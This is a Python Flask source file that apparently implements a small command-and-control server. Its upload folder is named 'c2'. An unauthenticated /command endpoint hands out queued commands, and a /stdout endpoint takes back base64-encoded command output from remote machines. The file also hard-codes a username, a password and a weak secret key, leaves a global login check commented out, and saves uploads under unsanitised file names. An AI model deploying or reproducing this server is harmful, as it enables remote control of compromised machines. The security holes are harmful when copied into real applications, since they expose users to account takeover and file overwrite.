from flask import Flask, request, jsonify, render_template, session, redirect, url_for
import os
import base64

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # Change this to a strong secret key

# Define the username and password
USERNAME = 'dawn'
PASSWORD = 'Password1234'

# Define the login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('upload_form'))
        else:
            return render_template('login.html', error='Invalid username or password')
    else:
        return render_template('login.html')

# Define the logout route
@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# Require login for all routes
#@app.before_request
#def require_login():
#    allowed_routes = ['login']
#    if request.endpoint not in allowed_routes and 'logged_in' not in session:
#        return redirect(url_for('login'))

# Define the upload route
@app.route('/upload', methods=['POST'])
def upload_file():
    # Check if user is logged in
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    # Check if the post request has the file part
    if 'file' not in request.files:
        return jsonify({'error': 'No file part in the request'}), 400
    file = request.files['file']
    # If the user does not select a file, the browser may submit an empty part without filename
    if file.filename == '':
        return jsonify({'error': 'No file selected for uploading'}), 400
    filename = file.filename
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    return jsonify({'message': 'File uploaded successfully.'}), 200

@app.route('/')
def upload_form():
    # Check if user is logged in
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('upload_form.html')

@app.route('/command')
def command():
    with open('command.txt', 'r') as f:
        file_contents = f.read()
    print(file_contents)
    return file_contents
@app.route('/stdout/<path:subpath>')
def stdout(subpath):
    with open('command.txt','w') as ifile:
        ifile.write('')
    with open('stdout.txt','w') as ofile:
        ofile.write(str(base64.b64decode(subpath)))
    return ""

if __name__ == '__main__':
    app.config['UPLOAD_FOLDER'] = '/home/dawn/c2'  # Change this to your desired upload folder
    app.run(host='0.0.0.0', port=5000)
